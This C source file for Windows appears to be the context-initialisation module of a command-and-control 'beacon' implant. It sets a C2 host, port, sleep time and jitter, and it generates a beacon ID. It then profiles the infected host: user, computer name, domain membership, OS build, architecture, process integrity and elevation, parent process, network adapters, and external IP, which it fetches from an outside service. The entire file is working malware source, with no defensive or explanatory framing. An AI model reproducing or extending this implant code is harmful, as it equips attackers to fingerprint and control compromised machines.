#include <beacon.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <bcrypt.h>

#ifndef BEACON_C2_HOST
#define BEACON_C2_HOST "127.0.0.1"
#endif
#ifndef BEACON_C2_PORT
#define BEACON_C2_PORT 8080
#endif

static void get_integrity_level(BEACON_CTX *ctx) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return;

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
    TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)LocalAlloc(LPTR, dwSize);
    if (tml && GetTokenInformation(hToken, TokenIntegrityLevel, tml, dwSize, &dwSize)) {
        DWORD level = *GetSidSubAuthority(tml->Label.Sid,
                        *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
        ctx->integrity_level = level;
        ctx->is_elevated     = (level >= SECURITY_MANDATORY_HIGH_RID);
        LocalFree(tml);
    }
    CloseHandle(hToken);
}

static void get_parent_pid(BEACON_CTX *ctx) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (pe.th32ProcessID == ctx->pid) {
                ctx->ppid = pe.th32ParentProcessID;
                wcsncpy(ctx->process_name, pe.szExeFile, 259);
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static void get_adapters(BEACON_CTX *ctx) {
    HANDLE heap = GetProcessHeap();

    DWORD dwSize = 0;
    GetAdaptersInfo(NULL, &dwSize);
    IP_ADAPTER_INFO *info = (IP_ADAPTER_INFO *)HeapAlloc(heap, 0, dwSize);
    if (!info || GetAdaptersInfo(info, &dwSize) != ERROR_SUCCESS) {
        HeapFree(heap, 0, info);
        ctx->adapters = (char *)HeapAlloc(heap, 0, 3);
        if (ctx->adapters) strcpy(ctx->adapters, "[]");
        return;
    }

    size_t cap = 1024, off = 0;
    char *buf = (char *)HeapAlloc(heap, 0, cap);
    if (!buf) { HeapFree(heap, 0, info); return; }

    buf[off++] = '[';
    BOOL first = TRUE;

    for (IP_ADAPTER_INFO *a = info; a; a = a->Next) {
        const char *ip = a->IpAddressList.IpAddress.String;
        if (strcmp(ip, "0.0.0.0") == 0 || a->AddressLength == 0) continue;

        BYTE *m = a->Address;
        char mac[18];
        wsprintfA(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                  m[0], m[1], m[2], m[3], m[4], m[5]);

        char entry[512];
        int elen = snprintf(entry, sizeof(entry),
            "%s{\"name\":\"%s\",\"ip\":\"%s\",\"mac\":\"%s\"}",
            first ? "" : ",", a->Description, ip, mac);

        while (off + (size_t)elen + 2 > cap) {
            cap *= 2;
            char *tmp = (char *)HeapReAlloc(heap, 0, buf, cap);
            if (!tmp) { HeapFree(heap, 0, buf); HeapFree(heap, 0, info); return; }
            buf = tmp;
        }
        memcpy(buf + off, entry, elen);
        off += elen;
        first = FALSE;
    }
    buf[off++] = ']';
    buf[off]   = '\0';

    char *final = (char *)HeapReAlloc(heap, 0, buf, off + 1);
    ctx->adapters = final ? final : buf;
    HeapFree(heap, 0, info);
}

static void get_external_ip(BEACON_CTX *ctx) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org",
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/",
                                             NULL, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD dwRead = 0;
        WinHttpReadData(hRequest, ctx->eip, sizeof(ctx->eip) - 1, &dwRead);
        ctx->eip[dwRead] = '\0';
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

static void get_os_info(BEACON_CTX *ctx) {
    OSVERSIONINFOEXW osvi = { .dwOSVersionInfoSize = sizeof(osvi) };
    typedef NTSTATUS(WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    RtlGetVersion_t RtlGetVersion =
        (RtlGetVersion_t)(void *)GetProcAddress(hNtdll, "RtlGetVersion");
    if (RtlGetVersion) RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    ctx->os_build = osvi.dwBuildNumber;
    wsprintfW(ctx->os_version, L"Windows %lu.%lu Build %lu",
              osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
}

static void get_arch(BEACON_CTX *ctx) {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: wcsncpy(ctx->arch, L"x64",     15); break;
        case PROCESSOR_ARCHITECTURE_INTEL: wcsncpy(ctx->arch, L"x86",     15); break;
        case PROCESSOR_ARCHITECTURE_ARM64: wcsncpy(ctx->arch, L"ARM64",   15); break;
        default:                           wcsncpy(ctx->arch, L"unknown", 15); break;
    }
    BOOL bWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &bWow64);
    ctx->is_64bit_proc = !bWow64 && (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
}

void beacon_ctx_init(BEACON_CTX *ctx) {
    MultiByteToWideChar(CP_UTF8, 0, BEACON_C2_HOST, -1, ctx->host, 255);
    ctx->port = BEACON_C2_PORT;
    ctx->sleep_ms   = 5000;
    ctx->jitter_pct = 10;

    ctx->pid        = GetCurrentProcessId();
    ctx->session_id = WTSGetActiveConsoleSessionId();

    BCryptGenRandom(NULL, (PUCHAR)&ctx->beacon_id, sizeof(ctx->beacon_id),
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    DWORD sz = 256;
    GetUserNameW(ctx->username, &sz);

    sz = 256;
    GetComputerNameW(ctx->hostname, &sz);

    NETSETUP_JOIN_STATUS join_status;
    LPWSTR domain_buf = NULL;
    if (NetGetJoinInformation(NULL, &domain_buf, &join_status) == NERR_Success) {
        ctx->is_domain_joined = (join_status == NetSetupDomainName);
        if (domain_buf) {
            wcsncpy(ctx->domain, domain_buf, 255);
            NetApiBufferFree(domain_buf);
        }
    }

    get_os_info(ctx);
    get_arch(ctx);
    get_integrity_level(ctx);
    get_parent_pid(ctx);
    get_adapters(ctx);
    get_external_ip(ctx);
}